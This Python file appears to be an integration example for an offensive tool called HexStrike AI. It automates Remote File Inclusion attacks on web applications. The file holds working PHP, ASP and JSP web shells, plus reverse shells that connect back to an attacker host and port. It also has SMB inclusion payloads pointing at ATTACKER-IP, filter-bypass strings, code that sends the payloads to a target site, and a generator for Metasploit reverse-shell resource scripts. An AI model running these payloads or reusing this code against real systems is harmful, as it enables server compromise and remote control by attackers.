#!/usr/bin/env python3
"""
RFI Implementation Example for HexStrike AI
Advanced Remote File Inclusion exploitation system demonstration

This file demonstrates how to integrate advanced RFI capabilities
into the existing HexStrike AI framework.
"""

import os
import time
import requests
import subprocess
from datetime import datetime
from urllib.parse import quote, urljoin
import base64
import json

class AdvancedRFIExploiter:
    """Advanced Remote File Inclusion exploitation system"""

    def __init__(self):
        self.payload_server_host = "http://127.0.0.1"
        self.payload_directory = "/tmp/rfi_payloads"
        self.shell_templates = self._initialize_shell_templates()
        self.bypass_techniques = self._initialize_bypass_techniques()
        self.smb_payloads = self._initialize_smb_payloads()
        self._ensure_payload_directory()

    def _ensure_payload_directory(self):
        """Ensure payload directory exists"""
        os.makedirs(self.payload_directory, exist_ok=True)

    def _initialize_shell_templates(self):
        """Initialize reverse shell templates for different technologies"""
        return {
            "php": {
                "simple": "<?php system($_GET['cmd']); ?>",
                "reverse_shell": """<?php
$ip = '{lhost}';
$port = {lport};
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>""",
                "webshell": """<?php
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    echo '<pre>' . shell_exec($cmd) . '</pre>';
}
?>""",
                "advanced": """<?php
error_reporting(0);
set_time_limit(0);
$ip = '{lhost}';
$port = {lport};
if (($f = 'stream_socket_client') && is_callable($f)) {
    $s = $f("tcp://$ip:$port");
    $s_type = 'stream';
} elseif (($f = 'fsockopen') && is_callable($f)) {
    $s = $f($ip, $port);
    $s_type = 'stream';
}
if (!$s) exit();
$s_desc = array(0 => $s, 1 => $s, 2 => $s);
$s_pipes = array();
$s_proc = @proc_open('/bin/sh', $s_desc, $s_pipes);
if (!$s_proc) exit();
for ($s_iter = 0; ; $s_iter++) {
    if (feof($s)) {
        break;
    }
    @proc_terminate($s_proc);
    break;
}
?>"""
            },
            "asp": {
                "simple": "<%eval request(\"cmd\")%>",
                "reverse_shell": """<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WScript.Network")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = oScript.ExpandEnvironmentStrings("%COMSPEC%")
If (Request.Form("cmd") <> "") Then
    szCMD = szCMD & " /c " & Request.Form("cmd")
    Set oExec = oScript.Exec(szCMD)
    Response.Write(Server.HTMLEncode(oExec.StdOut.ReadAll))
End If
%>"""
            },
            "jsp": {
                "simple": """<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>""",
                "reverse_shell": """<%@ page import="java.io.*,java.net.*" %>
<%
String host = "{lhost}";
int port = {lport};
Process p = new ProcessBuilder("/bin/bash").redirectErrorStream(true).start();
Socket s = new Socket(host, port);
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
OutputStream po = p.getOutputStream(), so = s.getOutputStream();
while(!s.isClosed()) {
    while(pi.available()>0) so.write(pi.read());
    while(pe.available()>0) so.write(pe.read());
    while(si.available()>0) po.write(si.read());
    so.flush(); po.flush();
    Thread.sleep(50);
    if(p.isAlive()) continue;
    break;
}
%>"""
            }
        }

    def _initialize_bypass_techniques(self):
        """Initialize RFI bypass techniques"""
        return {
            "null_byte": [
                "?",
                "%00",
                "%00.txt",
                "%00.php",
                "%2500",
                "%c0%ae"
            ],
            "case_manipulation": [
                "PHP",
                "pHp",
                "PhP",
                "phP"
            ],
            "encoding": [
                "url_encode",
                "double_url_encode",
                "unicode_encode",
                "base64_encode"
            ],
            "wrapper_techniques": [
                "data://",
                "php://input",
                "php://filter",
                "expect://",
                "zip://",
                "compress.zlib://",
                "compress.bzip2://",
                "rar://"
            ]
        }

    def _initialize_smb_payloads(self):
        """Initialize SMB-based RFI payloads for Windows targets"""
        return {
            "smb_basic": "//ATTACKER-IP/share/shell.php",
            "smb_authenticated": "//username:password@ATTACKER-IP/share/shell.php",
            "smb_variations": [
                "\\\\ATTACKER-IP\\share\\shell.php",
                "\\\\ATTACKER-IP\\c$\\windows\\temp\\shell.php",
                "file://ATTACKER-IP/share/shell.php"
            ]
        }

    def detect_rfi_parameters(self, target_url):
        """Detect potential RFI parameters using intelligent scanning"""
        print(f"[+] Detecting RFI parameters for: {target_url}")

        potential_params = []
        common_params = [
            "file", "page", "include", "inc", "path", "src", "url", "template",
            "content", "document", "data", "view", "lang", "language", "locale",
            "module", "action", "component", "plugin", "theme", "skin"
        ]

        # Simple parameter fuzzing approach
        for param in common_params[:10]:  # Limit to first 10 for performance
            test_url = f"{target_url}?{param}=test"
            potential_params.append({
                "parameter": param,
                "test_url": test_url,
                "method": "GET",
                "confidence": "MEDIUM"
            })

        return {
            "target": target_url,
            "parameters_found": len(potential_params),
            "parameters": potential_params,
            "scan_timestamp": datetime.now().isoformat()
        }

    def generate_rfi_payloads(self, shell_type="php", lhost="127.0.0.1", lport=4444):
        """Generate comprehensive RFI payloads with bypass techniques"""
        print(f"[+] Generating {shell_type} RFI payloads for {lhost}:{lport}")

        payloads = []

        # Generate base shells
        if shell_type in self.shell_templates:
            for shell_name, template in self.shell_templates[shell_type].items():
                formatted_shell = template.format(lhost=lhost, lport=lport)

                # Save shell to file
                filename = f"shell_{shell_type}_{shell_name}_{int(time.time())}.{shell_type}"
                filepath = os.path.join(self.payload_directory, filename)

                with open(filepath, 'w') as f:
                    f.write(formatted_shell)

                # Generate payload URLs with different techniques
                base_url = f"{self.payload_server_host}/{filename}"

                # Basic payload
                payloads.append({
                    "type": f"{shell_type}_{shell_name}",
                    "payload": base_url,
                    "technique": "basic",
                    "file_path": filepath,
                    "description": f"Basic {shell_type} {shell_name} shell"
                })

                # Null byte bypass
                for null_byte in self.bypass_techniques["null_byte"]:
                    payloads.append({
                        "type": f"{shell_type}_{shell_name}_nullbyte",
                        "payload": f"{base_url}{null_byte}",
                        "technique": "null_byte_bypass",
                        "file_path": filepath,
                        "description": f"{shell_type} shell with null byte bypass"
                    })

                # Case manipulation
                case_variations = [base_url.replace('.php', f'.{case}') for case in self.bypass_techniques["case_manipulation"]]
                for i, case_url in enumerate(case_variations):
                    payloads.append({
                        "type": f"{shell_type}_{shell_name}_case_{i}",
                        "payload": case_url,
                        "technique": "case_manipulation",
                        "file_path": filepath,
                        "description": f"{shell_type} shell with case manipulation"
                    })

        # Add SMB payloads for Windows targets
        if shell_type == "php":
            for smb_name, smb_payload in self.smb_payloads.items():
                if smb_name != "smb_variations":
                    payloads.append({
                        "type": f"smb_{smb_name}",
                        "payload": smb_payload.replace("ATTACKER-IP", lhost),
                        "technique": "smb_inclusion",
                        "file_path": "remote_smb",
                        "description": "SMB-based RFI for Windows targets"
                    })

        return {
            "shell_type": shell_type,
            "lhost": lhost,
            "lport": lport,
            "payload_count": len(payloads),
            "payloads": payloads,
            "payload_directory": self.payload_directory
        }

    def test_rfi_vulnerability(self, target_url, parameter, payloads_info):
        """Test RFI vulnerability with generated payloads"""
        print(f"[+] Testing RFI vulnerability: {target_url}?{parameter}=...")

        results = []

        for payload_info in payloads_info.get("payloads", [])[:5]:  # Limit to 5 tests for demo
            payload_url = payload_info["payload"]
            test_url = f"{target_url}?{parameter}={payload_url}"

            try:
                # Test with HTTP requests
                response = requests.get(test_url, timeout=10, allow_redirects=True)

                # Check response for RFI success indicators
                success_indicators = [
                    "Warning: include(",
                    "failed to open stream",
                    "shell_exec",
                    "system(",
                    "eval(",
                    "PHP Parse error"
                ]

                error_indicators = [
                    "allow_url_include",
                    "Remote file access is disabled",
                    "URL file-access is disabled"
                ]

                found_success = [ind for ind in success_indicators if ind in response.text]
                found_errors = [ind for ind in error_indicators if ind in response.text]

                if found_success:
                    results.append({
                        "payload": payload_info,
                        "test_url": test_url,
                        "status": "POTENTIAL_VULNERABLE",
                        "success_indicators": found_success,
                        "error_indicators": found_errors,
                        "response_code": response.status_code,
                        "response_length": len(response.text),
                        "technique": payload_info.get("technique", "unknown")
                    })
                elif found_errors:
                    results.append({
                        "payload": payload_info,
                        "test_url": test_url,
                        "status": "BLOCKED",
                        "success_indicators": [],
                        "error_indicators": found_errors,
                        "response_code": response.status_code,
                        "response_length": len(response.text),
                        "technique": payload_info.get("technique", "unknown")
                    })
                else:
                    results.append({
                        "payload": payload_info,
                        "test_url": test_url,
                        "status": "NO_INDICATION",
                        "success_indicators": [],
                        "error_indicators": [],
                        "response_code": response.status_code,
                        "response_length": len(response.text),
                        "technique": payload_info.get("technique", "unknown")
                    })

            except Exception as e:
                results.append({
                    "payload": payload_info,
                    "test_url": test_url,
                    "status": "ERROR",
                    "error": str(e),
                    "technique": payload_info.get("technique", "unknown")
                })

        return {
            "target": target_url,
            "parameter": parameter,
            "tests_performed": len(results),
            "results": results,
            "vulnerable_count": len([r for r in results if "VULNERABLE" in r.get("status", "")]),
            "test_timestamp": datetime.now().isoformat()
        }

    def create_metasploit_resource(self, rfi_results, lhost="127.0.0.1", lport=4444):
        """Create Metasploit resource script for RFI exploitation"""
        vulnerable_results = [r for r in rfi_results.get("results", []) if "VULNERABLE" in r.get("status", "")]

        if not vulnerable_results:
            return {"error": "No vulnerable RFI found to create Metasploit resource"}

        resource_script = f"""# Metasploit Resource Script for RFI Exploitation
# Generated by HexStrike AI RFI Engine
# Target: {rfi_results.get('target', 'unknown')}
# Parameter: {rfi_results.get('parameter', 'unknown')}

use exploit/multi/http/php_include
set RHOSTS {rfi_results.get('target', '').replace('http://', '').replace('https://', '').split('/')[0]}
set TARGETURI {rfi_results.get('target', '').split('/', 3)[-1] if '/' in rfi_results.get('target', '') else '/'}
set PHPURI http://{lhost}/shell.php
set LHOST {lhost}
set LPORT {lport}

# Alternative manual RFI URLs found:
"""

        for result in vulnerable_results[:5]:  # Limit to 5 results
            resource_script += f"# {result.get('test_url', '')}\n"

        resource_script += """
# Start handler
use multi/handler
set payload php/reverse_php
set LHOST {lhost}
set LPORT {lport}
exploit -j

# Execute the exploit
back
exploit
""".format(lhost=lhost, lport=lport)

        # Save resource script
        resource_filename = f"rfi_exploit_{int(time.time())}.rc"
        resource_path = os.path.join(self.payload_directory, resource_filename)

        with open(resource_path, 'w') as f:
            f.write(resource_script)

        return {
            "resource_script": resource_script,
            "resource_path": resource_path,
            "usage_command": f"msfconsole -r {resource_path}",
            "vulnerable_targets": len(vulnerable_results)
        }

    def comprehensive_rfi_assessment(self, target_url, shell_type="php", lhost="127.0.0.1", lport=4444):
        """Execute comprehensive RFI assessment workflow"""
        print(f"[+] Starting comprehensive RFI assessment for: {target_url}")

        # Phase 1: Parameter Detection
        print("[Phase 1] Detecting RFI parameters...")
        param_results = self.detect_rfi_parameters(target_url)

        # Phase 2: Payload Generation
        print("[Phase 2] Generating RFI payloads...")
        payload_results = self.generate_rfi_payloads(shell_type, lhost, lport)

        # Phase 3: Vulnerability Testing
        print("[Phase 3] Testing for RFI vulnerabilities...")
        test_results = []

        for param_info in param_results.get("parameters", [])[:3]:  # Test top 3 parameters
            parameter = param_info.get("parameter", "")
            if parameter:
                test_result = self.test_rfi_vulnerability(
                    target_url, parameter, payload_results
                )
                test_results.append(test_result)

        # Phase 4: Metasploit Resource Generation
        print("[Phase 4] Generating exploitation resources...")
        metasploit_resources = []

        for test_result in test_results:
            if test_result.get("vulnerable_count", 0) > 0:
                msf_resource = self.create_metasploit_resource(test_result, lhost, lport)
                metasploit_resources.append(msf_resource)

        # Summary
        total_vulns = sum(test.get("vulnerable_count", 0) for test in test_results)

        result = {
            "target": target_url,
            "shell_type": shell_type,
            "lhost": lhost,
            "lport": lport,
            "phases": {
                "parameter_detection": param_results,
                "payload_generation": payload_results,
                "vulnerability_testing": test_results,
                "metasploit_resources": metasploit_resources
            },
            "summary": {
                "parameters_found": param_results.get("parameters_found", 0),
                "payloads_generated": payload_results.get("payload_count", 0),
                "parameters_tested": len(test_results),
                "vulnerabilities_found": total_vulns,
                "metasploit_resources_created": len(metasploit_resources)
            }
        }

        print(f"[+] Assessment complete: {total_vulns} vulnerabilities found")
        return result

def demonstrate_rfi_integration():
    """Demonstrate RFI functionality integration with HexStrike AI"""

    print("=" * 60)
    print("HexStrike AI - Advanced RFI Exploitation Demo")
    print("=" * 60)

    # Initialize RFI exploiter
    rfi_exploiter = AdvancedRFIExploiter()

    # Example target (replace with actual test target)
    target_url = "http://example.com/vulnerable.php"

    # Execute comprehensive assessment
    assessment_result = rfi_exploiter.comprehensive_rfi_assessment(
        target_url=target_url,
        shell_type="php",
        lhost="192.168.1.100",
        lport=4444
    )

    # Display results
    print("\n[+] Assessment Summary:")
    print(f"    Target: {assessment_result['target']}")
    print(f"    Parameters Found: {assessment_result['summary']['parameters_found']}")
    print(f"    Payloads Generated: {assessment_result['summary']['payloads_generated']}")
    print(f"    Vulnerabilities: {assessment_result['summary']['vulnerabilities_found']}")
    print(f"    MSF Resources: {assessment_result['summary']['metasploit_resources_created']}")

    # Save results to file
    results_file = f"/tmp/rfi_assessment_{int(time.time())}.json"
    with open(results_file, 'w') as f:
        json.dump(assessment_result, f, indent=2)

    print(f"\n[+] Detailed results saved to: {results_file}")

    return assessment_result

if __name__ == "__main__":
    # Run demonstration
    demonstrate_rfi_integration()